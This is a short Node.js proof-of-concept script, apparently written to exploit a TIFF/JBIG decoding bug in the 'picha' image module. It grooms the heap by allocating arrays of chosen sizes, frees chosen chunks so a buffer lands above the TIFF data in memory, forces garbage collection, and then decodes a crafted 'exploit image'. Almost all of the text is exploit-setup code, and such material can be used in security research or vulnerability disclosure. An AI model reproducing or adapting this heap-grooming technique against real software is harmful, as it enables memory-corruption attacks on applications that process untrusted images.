var fs = require('fs');
var path = require('path');
var assert = require('assert');
var picha = require('.');


let ts = []
let ps = []

// Seems to work more reliable if we allocate a bunch 
for (let i = 0; i < 100; i++) {
    ts[i] = new Uint8Array(2222);    
    ps[i] = new Uint8Array(1087);    
}

// Two big mallocs
var big1 = new Uint8Array(1048576);
var big2 = new Uint8Array(1048576);

// Create desired sized chunks with allocated inbetween to prevent
// coalscing
// allocate buffer first then tif so buffer will be above
// tif in memory
var b1 = new Uint8Array(2222);
var a1 = new Uint8Array(2222);
var a2 = new Uint8Array(1087);
var b3 = new Uint8Array(2222);

var rest    = new Uint8Array(555);

// free data chunk, then the tif chunk so 
a1 = null;
a2 = null;

// hopefully any other mallocs will use this
rest   = null;

// get OS to acutally free memory
global.gc(true);

// Load exploit image
var syncImage = picha.decodeTiffSync(fs.readFileSync("jbig-crash.tif"));






